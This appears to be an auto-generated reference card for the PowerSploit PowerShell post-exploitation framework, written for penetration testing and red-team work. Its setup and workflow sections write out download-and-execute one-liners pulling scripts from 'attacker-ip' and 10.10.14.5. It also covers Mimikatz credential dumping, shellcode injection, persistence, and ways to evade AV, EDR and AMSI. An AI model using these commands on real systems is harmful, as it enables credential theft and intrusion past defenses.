---
name: PowerSploit
description: PowerShell post-exploitation framework providing modules for recon,
  privilege escalation, credential harvesting, and persistence on Windows
  targets.
registry: registry
tool_id: powersploit
category: post-exploitation
tags:
  - powershell
  - post-exploitation
  - windows
  - privilege-escalation
  - credential-dumping
  - recon
  - persistence
mitre_techniques:
  - T1134
  - T1134.001
  - T1087.001
  - T1123
  - T1547.001
  - T1547.005
  - T1059.001
  - T1543.003
  - T1555.004
  - T1012
  - T1620
  - T1053.005
summary: "PowerSploit is a collection of PowerShell modules for Windows
  post-exploitation located at /opt/tools/PowerSploit on RTPI. It is NOT an
  executable—you must transfer scripts to the target and execute them within a
  PowerShell session. Core modules: Recon (Invoke-Portscan, PowerView for domain
  enumeration), Privesc (PowerUp for privilege escalation checks), Exfiltration
  (Invoke-Mimikatz for credential dumping, Get-MicrophoneAudio), Persistence
  (registry/scheduled task/SSP persistence), ScriptModification
  (Out-EncodedCommand for payload encoding). Use after initial access is
  achieved on Windows targets. Load modules with Import-Module or dot-source
  individual .ps1 files. Modern AV/EDR commonly detects PowerSploit; use
  obfuscation or in-memory execution. PowerUp's Invoke-AllChecks is essential
  for finding privilege escalation vectors. Invoke-Mimikatz requires
  admin/SYSTEM privileges for credential dumping. PowerView enables domain
  reconnaissance without additional tools. All scripts support Get-Help for
  usage details. Execution policy bypass often required: powershell.exe
  -ExecutionPolicy Bypass -NoProfile. Reflective loading via IEX (New-Object
  Net.WebClient).DownloadString avoids disk writes but generates network
  traffic. Output is PowerShell objects; pipe to Out-File or format as needed.
  Unblock files with Unblock-File to suppress Internet download warnings."
sources:
  - https://github.com/PowerShellMafia/PowerSploit
  - https://www.linkedin.com/posts/av10v_github-powershellmafiapowersploit-powersploit-activity-7284311010725810177-vKUa
  - https://powersploit.com/
  - https://attack.mitre.org/software/S0194/
  - https://blog.certcube.com/powerup-cheatsheet/
  - https://powersploit.readthedocs.io/
  - https://www.infosecinstitute.com/resources/hacking/powershell-toolkit-powersploit/
  - https://techvomit.net/useful-powershell-commands/
  - https://shannonscncjdeblog.blogspot.com/2018/08/powershell-command-line-options-starter.html
  - https://ss64.com/ps/
  - https://www.cycognito.com/learn/red-teaming/red-teaming-vs-pentesting/
  - https://www.offsec.com/blog/red-teaming-vs-pentesting/
generated_at: 2026-05-19T11:12:32.306Z
generated_by: anthropic
source_hash: ef789294e9ddffbeda56806d8813fd711a44d42e8c826f1f71d65fc354c1634c
---

# PowerSploit

## Overview

PowerSploit is a mature PowerShell post-exploitation framework organized into functional modules: Recon (network/domain enumeration), Privesc (privilege escalation identification), Exfiltration (credential harvesting, data extraction), Persistence (maintaining access), and ScriptModification (payload encoding/obfuscation). It is installed as a directory of .ps1/.psm1 files at /opt/tools/PowerSploit on RTPI. These scripts must be transferred to the target Windows system and executed within a PowerShell session—there is no standalone binary. PowerSploit is widely signatured by AV/EDR solutions; expect detections unless obfuscated or loaded reflectively into memory.

## When to use

Use PowerSploit after achieving initial code execution on a Windows target with PowerShell access. Deploy during internal penetration tests or red team engagements for privilege escalation (PowerUp scans for misconfigurations), credential harvesting (Invoke-Mimikatz), domain enumeration (PowerView), lateral movement preparation, and persistence establishment. Appropriate when operating in environments where PowerShell is available and where you need post-exploitation capabilities without uploading compiled binaries. Not suitable for initial access; requires existing command execution. Choose targeted modules rather than uploading entire framework to minimize footprint. PowerView is essential for Active Directory environments; PowerUp is critical for Windows privilege escalation; Invoke-Mimikatz for credential access on systems where you have admin rights.

## Authentication & setup

PowerSploit requires no authentication—it operates within the security context of the PowerShell session executing it. Setup involves transferring scripts to the target. Methods: (1) Direct file transfer via existing C2 channel, SMB, or HTTP download. (2) Reflective loading via IEX to avoid disk writes: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerUp.ps1'); Invoke-AllChecks". (3) Copy entire /opt/tools/PowerSploit directory to target's PowerShell module path ($Env:PSModulePath), then Import-Module PowerSploit. PowerShell execution policy often blocks scripts; bypass with -ExecutionPolicy Bypass or -Exec Bypass flags. Unblock downloaded files: Get-ChildItem /path/to/PowerSploit -Recurse | Unblock-File. For individual scripts, dot-source them: . .\PowerUp.ps1 loads functions into current session. Modules can run standalone; no dependencies between most scripts. Verify with Get-Command -Module PowerSploit or Get-Help <function-name>.

## Key commands / parameters

PowerUp (Privesc): Invoke-AllChecks runs all privilege escalation checks; outputs services with weak permissions, unquoted service paths, hijackable DLLs, AlwaysInstallElevated registry keys. Get-ServiceUnquoted, Get-ModifiableServiceFile, Get-UnattendedInstallFile are granular checks. Invoke-Mimikatz (Exfiltration): Invoke-Mimikatz -DumpCreds dumps credentials from LSASS; requires admin/SYSTEM. -Command parameter passes native Mimikatz commands. PowerView (Recon): Get-NetDomain, Get-NetUser, Get-NetComputer, Get-NetGroup enumerate Active Directory objects. Get-DomainUser -SPN finds Kerberoastable accounts. Find-LocalAdminAccess identifies machines where current user has admin. Invoke-Portscan (Recon): Invoke-Portscan -Hosts <IPs> -Ports <ports> scans targets; supports -TopPorts, output to GNMAP/XML with -oG/-oX. Invoke-Shellcode (CodeExecution): Inject shellcode into processes; -ProcessID targets specific PID, -Shellcode accepts byte array. ScriptModification: Out-EncodedCommand -ScriptBlock {code} generates Base64-encoded command for evasion. All functions support Get-Help <function> -Full for parameters. Common pattern: Import module, run checks, export results with Out-File or | Out-File results.txt.

## Example workflows

Privilege escalation enumeration: Transfer PowerUp.ps1 to target. Execute: powershell.exe -ExecutionPolicy Bypass -File PowerUp.ps1; then Invoke-AllChecks | Out-File -Encoding ASCII privesc.txt. Review output for abusable service permissions or registry keys. Credential harvesting: Achieve SYSTEM or admin context. Load Invoke-Mimikatz reflectively: powershell.exe -NoP -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" > creds.txt. Domain enumeration: From domain-joined system, load PowerView: Import-Module .\PowerView.ps1. Run Get-NetDomain to confirm domain connectivity, Get-NetUser -AdminCount to find privileged accounts, Get-DomainComputer | Select-Object dnshostname to list computers. Network reconnaissance: Invoke-Portscan -Hosts 192.168.1.0/24 -TopPorts 50 -oA scan_results scans subnet, outputs GNMAP format. Persistence: Use New-UserPersistenceOption with -Registry or -ScheduledTask to establish persistence; specify trigger and payload. Encoding payloads: Out-EncodedCommand -Path payload.ps1 generates obfuscated one-liner for execution.

## Output format

PowerSploit modules return PowerShell objects that display as formatted text in the console. PowerUp outputs structured text with section headers (e.g., [*] Checking service permissions..., [*] Checking for unquoted service paths...) followed by findings with properties like ServiceName, Path, ModifiablePath, AbuseFunction. Invoke-Mimikatz outputs Mimikatz's native text format with sections for sekurlsa::logonpasswords, sekurlsa::tickets, etc., showing usernames, domains, NTLM hashes, plaintext passwords. PowerView returns objects with properties matching AD attributes (samaccountname, distinguishedname, memberof, serviceprincipalname). Invoke-Portscan returns OpenPorts property for each host. Redirect output with > file.txt or | Out-File -Encoding ASCII file.txt to capture results. Objects can be filtered/formatted with Where-Object, Select-Object, Format-List, Format-Table. Export structured data with Export-Csv, ConvertTo-Json for parsing. Console output is verbose; capture to files for analysis and reporting.

## Common pitfalls

AV/EDR detection: PowerSploit is heavily signatured. AMSI (Antivirus Scan Interface) in PowerShell 5+ scans script content at runtime. Mitigation: obfuscate scripts, use AMSI bypass techniques, or load in PowerShell downgrade (v2 if available). Execution policy blocks: Default Restricted or AllSigned policies prevent script execution; always use -ExecutionPolicy Bypass or -Exec Bypass. Insufficient privileges: Invoke-Mimikatz requires SeDebugPrivilege (admin/SYSTEM); many persistence techniques need admin. PowerUp identifies opportunities but doesn't auto-exploit—manual follow-up required. Network indicators: Reflective loading via DownloadString generates HTTP GET requests to attacker infrastructure; consider host-based transfer methods in monitored environments. Module dependencies: Some functions require specific Windows versions or configurations (e.g., PowerView needs domain connectivity). AppLocker/CLM: Constrained Language Mode and application whitelisting block script execution; may require breakout techniques. Large output: Invoke-AllChecks and domain enumeration produce verbose output; redirect to files to avoid missing findings. Script modifications: Ensure scripts are unblocked (Unblock-File) or downloaded files prompt execution warnings. Logging: PowerShell v5+ enables ScriptBlock logging by default; assume actions are logged on mature systems.

## References

• https://github.com/PowerShellMafia/PowerSploit
• https://powersploit.readthedocs.io/
• https://attack.mitre.org/software/S0194/
• https://blog.certcube.com/powerup-cheatsheet/
• https://www.infosecinstitute.com/resources/hacking/powershell-toolkit-powersploit/
• https://techvomit.net/useful-powershell-commands/
